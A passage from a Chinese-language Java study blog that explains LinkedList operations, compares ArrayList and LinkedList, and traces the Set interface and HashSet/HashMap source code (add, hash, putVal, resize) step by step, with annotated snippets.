class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">else</span>  <br>        next.prev = <span class="hljs-literal">null</span>; <span class="hljs-comment">//next的pre置空（原为first）</span><br>    size--; <span class="hljs-comment">//size减一</span><br>    modCount++;<br>    <span class="hljs-keyword">return</span> element;<br>&#125;<br></code></pre></td></tr></table></figure><p>删除第一个，意味断掉原先指向first的节点与first的联系，再将first指向下一个结点。</p><p><strong>修改、查找和遍历操作</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//修改某个结点对象</span><br>linkedList.set(<span class="hljs-number">1</span>,<span class="hljs-number">999</span>);<br>System.out.println(<span class="hljs-string">&quot;linkedlist=&quot;</span>+linkedList);<br><span class="hljs-comment">//得到某个结点</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> linkedList.get(<span class="hljs-number">1</span>);<br>System.out.println(o);<br><span class="hljs-comment">//遍历</span><br><span class="hljs-comment">//迭代器</span><br><span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> linkedList.iterator();<br><span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>  <span class="hljs-type">Object</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span>  iterator.next();<br>  System.out.println(<span class="hljs-string">&quot;next=&quot;</span>+next);<br><br>&#125;<br><span class="hljs-comment">//增强for</span><br><span class="hljs-keyword">for</span> (Object o1 : linkedList) &#123;<br>  System.out.println(<span class="hljs-string">&quot;o1=&quot;</span> + o1);<br>&#125;<br><span class="hljs-comment">//普通for</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; linkedList.size(); i++) &#123;<br>  System.out.println(linkedList.get(i));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ArrayList和LinkedList的比较"><a href="#ArrayList和LinkedList的比较" class="headerlink" title="ArrayList和LinkedList的比较"></a>ArrayList和LinkedList的比较</h3><table><thead><tr><th></th><th>底层结构</th><th>增删的效率</th><th>改查的效率</th></tr></thead><tbody><tr><td>ArrayList</td><td>可变数组</td><td>较低<br />数组扩容</td><td>较高</td></tr><tr><td>LinkedList</td><td>双向链表</td><td>较高，通过链表追加</td><td>较低</td></tr></tbody></table><p><strong>如何选择ArrayList和LinkedList:</strong></p><p>1）如果我们<strong>改查</strong>的操作多，选择<strong>ArrayList</strong></p><p>2）如果我们<strong>增删</strong>的操作多，选择<strong>LinkedList</strong></p><p>3） 一般来说，在程序中，80％－90％都是查询，因此大部分情况下会选择ArrayList</p><p>4）在一个项目中，根据业务灵活选择，也可能这样，一个模块使用的是ArrayList，另外一个模块是LinkedList.</p><h2 id="7-Set接口"><a href="#7-Set接口" class="headerlink" title="7.Set接口"></a>7.Set接口</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230306204836888.png" alt="image-20230306204836888" style="zoom:50%;" /><h3 id="基本介绍-2"><a href="#基本介绍-2" class="headerlink" title="基本介绍"></a><strong>基本介绍</strong></h3><ol><li><p><strong>无序</strong>（添加和取出的顺序不一致），没有索引</p></li><li><p><strong>不允许重复元素</strong>，所以最多包含一个null</p></li><li><p>JDK API中Set接口的实现类有：</p><blockquote><h2 id="Interface-Set"><a href="#Interface-Set" class="headerlink" title="Interface Set"></a>Interface Set<E></h2><ul><li><ul><li><p><strong>参数类型</strong></p><p><code>E</code> - 由此集合维护的元素的类型 </p></li><li><p>All Superinterfaces: </p><p><a href="itss://chm/java/util/Collection.html">Collection</a> <E>， <a href="itss://chm/java/lang/Iterable.html">Iterable</a> <E></p></li><li><p>All Known Subinterfaces: </p><p><a href="itss://chm/java/util/NavigableSet.html">NavigableSet</a> <E>， <a href="itss://chm/java/util/SortedSet.html">SortedSet</a> <E></p></li><li><p>所有已知实现类：</p><p><a href="itss://chm/java/util/AbstractSet.html">AbstractSet</a> ， <a href="itss://chm/java/util/concurrent/ConcurrentHashMap.KeySetView.html">ConcurrentHashMap.KeySetView</a> ， <a href="itss://chm/java/util/concurrent/ConcurrentSkipListSet.html">ConcurrentSkipListSet</a> ， <a href="itss://chm/java/util/concurrent/CopyOnWriteArraySet.html">CopyOnWriteArraySet</a> ， <a href="itss://chm/java/util/EnumSet.html">EnumSet</a> ， <a href="itss://chm/java/util/HashSet.html">HashSet</a> ， <a href="itss://chm/javax/print/attribute/standard/JobStateReasons.html">JobStateReasons</a> ， <a href="itss://chm/java/util/LinkedHashSet.html">LinkedHashSet</a>， <a href="itss://chm/java/util/TreeSet.html">TreeSet</a></p></li></ul></li></ul></blockquote></li></ol><h3 id="常用方法和遍历方式"><a href="#常用方法和遍历方式" class="headerlink" title="常用方法和遍历方式"></a>常用方法和遍历方式</h3><p><strong>常用方法：</strong></p><p>和List接口一样，Set接口也是Collection的子接口，因此，常<strong>用方法和 Collection接口一样</strong>.</p><p><strong>遍历方式：</strong></p><p>同Collection的遍历方式一样，因为Set接口是Collection接口的子接口。</p><p>1.可以使用迭代器</p><p>2.增强for</p><p>3.<strong>不能使用索引</strong>的方式来获取.（因为无序）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Set</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>set.add(<span class="hljs-string">&quot;john&quot;</span>);<br>set.add(<span class="hljs-string">&quot;lucy&quot;</span>);<br>set.add(<span class="hljs-string">&quot;john&quot;</span>);<br>set.add(<span class="hljs-string">&quot;jack&quot;</span>);<br>set.add(<span class="hljs-literal">null</span>);<br>set.add(<span class="hljs-literal">null</span>);<br>System.out.println(<span class="hljs-string">&quot;set=&quot;</span>+set);<br><span class="hljs-comment">//输出：set=[null, john, lucy, jack]</span><br><span class="hljs-comment">//添加和输出顺序不同（无序），不能存放重复的元素，可以添加null但只限一个</span><br><span class="hljs-comment">//输出的顺序一直是相同的</span><br>set.add(<span class="hljs-string">&quot;mary&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;set=&quot;</span>+set);<br><span class="hljs-comment">//输出：set=[null, mary, john, lucy, jack]</span><br><br><span class="hljs-comment">//遍历</span><br><span class="hljs-comment">//1.迭代器</span><br><span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> set.iterator();<br><span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> iterator.next();<br>    System.out.println(<span class="hljs-string">&quot;obj=&quot;</span>+obj);<br>&#125;<br><span class="hljs-comment">//obj=null</span><br><span class="hljs-comment">//obj=mary</span><br><span class="hljs-comment">//obj=john</span><br><span class="hljs-comment">//obj=lucy</span><br><span class="hljs-comment">//obj=jack</span><br><br><span class="hljs-comment">//2.增强for</span><br><span class="hljs-keyword">for</span> (Object o : set) &#123;<br>    System.out.println(<span class="hljs-string">&quot;o=&quot;</span>+o);<br>&#125;<br><span class="hljs-comment">//o=null</span><br><span class="hljs-comment">//o=mary</span><br><span class="hljs-comment">//o=john</span><br><span class="hljs-comment">//o=lucy</span><br><span class="hljs-comment">//o=jack</span><br><br><span class="hljs-comment">//无法使用普通for（因为不能通过索引获取）</span><br></code></pre></td></tr></table></figure><h2 id="8-HashSet"><a href="#8-HashSet" class="headerlink" title="8.HashSet"></a>8.HashSet</h2><h3 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h3><ol><li><p>HashSet实现了Set接口</p></li><li><p>HashSet实际上是HashMap (下为源码)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">HashSet</span><span class="hljs-params">()</span> &#123;<br>    map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>可以存放null，但只能存放一个</p></li><li><p>HashSet不保证元素是有序的，取决于hash后，再确定索引的结果（不保证存放元素的顺序和取出顺序一致）</p></li><li><p>不能有重复元素／对象.在前面Set接口使用已经讲过</p></li></ol><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br><span class="hljs-comment">//执行add方法会返回boolean值，成功t，失败f</span><br>System.out.println(set.add(<span class="hljs-string">&quot;john&quot;</span>)); <span class="hljs-comment">//T</span><br>System.out.println(set.add(<span class="hljs-string">&quot;lucy&quot;</span>)); <span class="hljs-comment">//T</span><br>System.out.println(set.add(<span class="hljs-string">&quot;john&quot;</span>)); <span class="hljs-comment">//F</span><br>System.out.println(set.add(<span class="hljs-string">&quot;jack&quot;</span>)); <span class="hljs-comment">//T</span><br>System.out.println(set.add(<span class="hljs-string">&quot;Rose&quot;</span>)); <span class="hljs-comment">//T</span><br><br>set.remove(<span class="hljs-string">&quot;john&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;set=&quot;</span>+set);  <span class="hljs-comment">//set=[Rose, lucy, jack]</span><br><br>set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>System.out.println(<span class="hljs-string">&quot;set=&quot;</span>+set); <span class="hljs-comment">//0</span><br><br>set.add(<span class="hljs-string">&quot;lucy&quot;</span>);<br>set.add(<span class="hljs-string">&quot;lucy&quot;</span>); <span class="hljs-comment">//加入不了，因为和前一句指向同一常量池</span><br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;tom&quot;</span>)); <span class="hljs-comment">//OK</span><br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;tom&quot;</span>)); <span class="hljs-comment">//OK</span><br>System.out.println(<span class="hljs-string">&quot;set=&quot;</span>+set); <span class="hljs-comment">//set=[Dog&#123;name=&#x27;tom&#x27;&#125;, lucy, Dog&#123;name=&#x27;tom&#x27;&#125;]</span><br><br><span class="hljs-comment">/***/</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br><span class="hljs-comment">/***</span><br></code></pre></td></tr></table></figure><p>添加两个name属性相同的Dog对象是可行的。</p><p>但下面这种情况是不可行的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//经典面试题</span><br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hsp&quot;</span>)); <span class="hljs-comment">//ok</span><br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hsp&quot;</span>)); <span class="hljs-comment">//不ok</span><br></code></pre></td></tr></table></figure><h3 id="HashSet底层机制说明"><a href="#HashSet底层机制说明" class="headerlink" title="HashSet底层机制说明"></a>HashSet底层机制说明</h3><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230303174405971.png" alt="image-20230303174405971" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//模拟一个HashSet的底层（HashMap的底层结构）</span><br><span class="hljs-comment">// 1.创建一个数组，数组类型为Node</span><br><span class="hljs-comment">// 2.（有些人直接称呼Node[]数组为链表）</span><br>Node[] table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[<span class="hljs-number">16</span>];<br><span class="hljs-comment">// 3.创建结点</span><br><span class="hljs-type">Node</span> <span class="hljs-variable">john</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;john&quot;</span>, <span class="hljs-literal">null</span>);<br>table[<span class="hljs-number">2</span>] = john;<br><span class="hljs-type">Node</span> <span class="hljs-variable">jack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-literal">null</span>);<br>john.next = jack; <span class="hljs-comment">//将jack结点挂在到john</span><br><span class="hljs-type">Node</span> <span class="hljs-variable">rose</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;rose&quot;</span>, <span class="hljs-literal">null</span>);<br>jack.next = rose; <span class="hljs-comment">//将jack结点挂在到john</span><br><span class="hljs-type">Node</span> <span class="hljs-variable">lucy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;lucy&quot;</span>, <span class="hljs-literal">null</span>);<br>table[<span class="hljs-number">3</span>] = lucy; <span class="hljs-comment">//把lucy放在table表索引为3的位置</span><br>System.out.println(<span class="hljs-string">&quot;table=&quot;</span> + table);<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230303174319784.png" alt="image-20230303174319784" style="zoom:50%;" /><h4 id="HashSet添加元素"><a href="#HashSet添加元素" class="headerlink" title="HashSet添加元素"></a>HashSet添加元素</h4><p><strong>⭐️结论</strong></p><ol><li>HashSet 底层是 HashMap</li><li>添加一个元素时，先得到hash值 －转成－＞索引值</li><li>找到存储数据表table，看这个<strong>索引</strong>位置<strong>是否已经存放</strong>的有元素<ul><li>如果<strong>没有</strong>，直接<strong>加入</strong></li><li>如果<strong>有</strong>，调用 <strong>equals</strong> 比较（equals方法需要程序员确定）。<ul><li>如果相同，就放弃添加</li><li>如果不相同，则添加到最后</li></ul></li></ul></li><li>在Java8中，如果一条链表的元素个数 到达 TREEIFY_THRESHOLD（默认是8），并且table的大小＞＝MIN_TREEIFY_CAPACITY（默认64），就会进行树化（红黑树）</li></ol><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(); <span class="hljs-comment">//①</span><br>hashSet.add(<span class="hljs-string">&quot;java&quot;</span>); <span class="hljs-comment">//②第一次添加</span><br>hashSet.add(<span class="hljs-string">&quot;php&quot;</span>); <span class="hljs-comment">//③第二次添加</span><br>hashSet.add(<span class="hljs-string">&quot;java&quot;</span>); <span class="hljs-comment">//④添加一次已添加过的元素</span><br>System.out.println(<span class="hljs-string">&quot;set=&quot;</span>+hashSet);<br></code></pre></td></tr></table></figure><p>① 新建，构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">HashSet</span><span class="hljs-params">()</span> &#123;<br>    map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>&#125;<br></code></pre></td></tr></table></figure><p>②第一次添加，调用add</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> &#123; <span class="hljs-comment">//e = &quot;java&quot;</span><br>    <span class="hljs-keyword">return</span> map.put(e, PRESENT)==<span class="hljs-literal">null</span>; <span class="hljs-comment">//调用put()</span><br>&#125;<br></code></pre></td></tr></table></figure><p>执行put方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<span class="hljs-comment">//②-1</span><br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">//②-2</span><br>&#125;<br></code></pre></td></tr></table></figure><p>②-1：key指e（java），value指PRESENT（统一占位用）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">PRESENT</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br></code></pre></td></tr></table></figure><p>②-2：hash(key)，key为空返回0，不为空使用hashCode返回传进来的key对应hash值。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span>(<span class="hljs-built_in">Object</span> <span class="hljs-built_in">key</span>) &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-title function_">return</span> (<span class="hljs-built_in">key</span> == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = <span class="hljs-built_in">key</span>.<span class="hljs-property">hashCode</span>()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>putVal（详细见下注释）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> V <span class="hljs-title function_">putVal</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, K key, V value, <span class="hljs-type">boolean</span> onlyIfAbsent,</span><br><span class="hljs-params">               <span class="hljs-type">boolean</span> evict)</span> &#123;<br>    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="hljs-type">int</span> n, i;  <span class="hljs-comment">//辅助变量</span><br>  <br>  <span class="hljs-comment">//table就是HashMap的一个数组，类型是Node[] （类似于上一个示例）</span><br>  <span class="hljs-comment">//如果当前table为null，或者大小为0</span><br>    <span class="hljs-keyword">if</span> ((tab = table) == <span class="hljs-literal">null</span> || (n = tab.length) == <span class="hljs-number">0</span>) <br>        n = (tab = resize()).length; <span class="hljs-comment">// n = 16，详细resize见②-2-1</span><br>  <span class="hljs-comment">//根据key得到hash值 去计算该key应该存放到table表的哪个索引位置，并把位置赋给p，再判断p是否为空</span><br>    <span class="hljs-keyword">if</span> ((p = tab[i = (n - <span class="hljs-number">1</span>) &amp; hash]) == <span class="hljs-literal">null</span>)<br>      <span class="hljs-comment">//如果为空，表示没有存放过数据。</span><br>      <span class="hljs-comment">//创建一个node（key=“java”，value=PRESENT），放在table[i]</span><br>        tab[i] = newNode(hash, key, value, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">//不进入，暂时省略</span><br>    &#125;<br>    ++modCount;<br>    <span class="hljs-keyword">if</span> (++size &gt; threshold) <span class="hljs-comment">//判断size是否到临界值</span><br>        resize();<br>    afterNodeInsertion(evict); <span class="hljs-comment">//空方法</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">//返回null，代表成功，回到②-2</span><br>&#125;<br></code></pre></td></tr></table></figure><p>②-2-1：resize</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;<br>    Node&lt;K,V&gt;[] oldTab = table; <span class="hljs-comment">//table为空</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">oldCap</span> <span class="hljs-operator">=</span> (oldTab == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : oldTab.length; <span class="hljs-comment">//oldTab: 0</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">oldThr</span> <span class="hljs-operator">=</span> threshold;<br>    <span class="hljs-type">int</span> newCap, newThr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (oldCap &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//不进入</span><br>      <span class="hljs-comment">//*** 省略 ***//</span><br>    <span class="hljs-keyword">else</span> &#123;               <span class="hljs-comment">// zero initial threshold signifies using defaults  //进入</span><br>        newCap = DEFAULT_INITIAL_CAPACITY; <span class="hljs-comment">//默认大小，1&lt;&lt;4，也就是16</span><br>        newThr = (<span class="hljs-type">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); <span class="hljs-comment">//临界值，DEFAULT_LOAD_FACTOR=0.75，乘以16=12</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (newThr == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//不进入</span><br>        <span class="hljs-comment">//*** 省略 ***// </span><br>    &#125;<br>    threshold = newThr; <span class="hljs-comment">//threshold临界值 = 12</span><br>    <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[newCap]; <span class="hljs-comment">//以值为16的newCap创建Node</span><br>    table = newTab; <span class="hljs-comment">//newTab赋给table</span><br>    <span class="hljs-keyword">if</span> (oldTab != <span class="hljs-literal">null</span>) &#123; <br>  <span class="hljs-comment">//*** 省略 ***// </span><br>    &#125;<br>    <span class="hljs-keyword">return</span> newTab; <span class="hljs-comment">//返回newTab</span><br>&#125;<br></code></pre></td></tr></table></figure><p>③第二次添加</p><p>调用put和hash 与第一次添加没什么不同。</p><p>调用putvalue。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> V <span class="hljs-title function_">putVal</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, K key, V value, <span class="hljs-type">boolean</span> onlyIfAbsent,</span><br><span class="hljs-params">               <span class="hljs-type">boolean</span> evict)</span> &#123;<br>  <span class="hljs-comment">//key为“php”，value为PRESENT</span><br>    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="hljs-type">int</span> n, i;<br>    <span class="hljs-keyword">if</span> ((tab = table) == <span class="hljs-literal">null</span> || (n = tab.length) == <span class="hljs-number">0</span>) <span class="hljs-comment">//有数据，所以不进入</span><br>        n = (tab = resize()).length;<br>    <span class="hljs-keyword">if</span> ((p = tab[i = (n - <span class="hljs-number">1</span>) &amp; hash]) == <span class="hljs-literal">null</span>) <span class="hljs-comment">//计算的位置p是否为空</span><br>      <span class="hljs-comment">//创建一个node（key=“php”，value=PRESENT），放在table[i]</span><br>        tab[i] = newNode(hash, key, value, <span class="hljs-literal">null</span>); <br>    <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-comment">//不进入，暂时省略</span><br>    &#125;<br>    ++modCount;<br>    <span class="hljs-keyword">if</span> (++size &gt; threshold) <span class="hljs-comment">//size=2，小于临界值12</span><br>        resize();<br>    afterNodeInsertion(evict); <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>④添加一个已有的数据</p><p>add和hash和前面没什么区别，省略。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> V <span class="hljs-title function_">putVal</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, K key, V value, <span class="hljs-type">boolean</span> onlyIfAbsent,</span><br><span class="hljs-params">               <span class="hljs-type">boolean</span> evict)</span> &#123;<br>    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="hljs-type">int</span> n, i;<br>    <span class="hljs-keyword">if</span> ((tab = table) == <span class="hljs-literal">null</span> || (n = tab.length) == <span class="hljs-number">0</span>)<br>        n = (tab = resize()).length;<br>    <span class="hljs-keyword">if</span> ((p = tab[i = (n - <span class="hljs-number">1</span>) &amp; hash]) == <span class="hljs-literal">null</span>) <span class="hljs-comment">//这里计算出的hash值和前面的第一次添加的相同，所以tab的该位置存在数据，所以不为空</span><br>        <span class="hljs-comment">//**省略***//</span><br>    <span class="hljs-keyword">else</span> &#123; <span 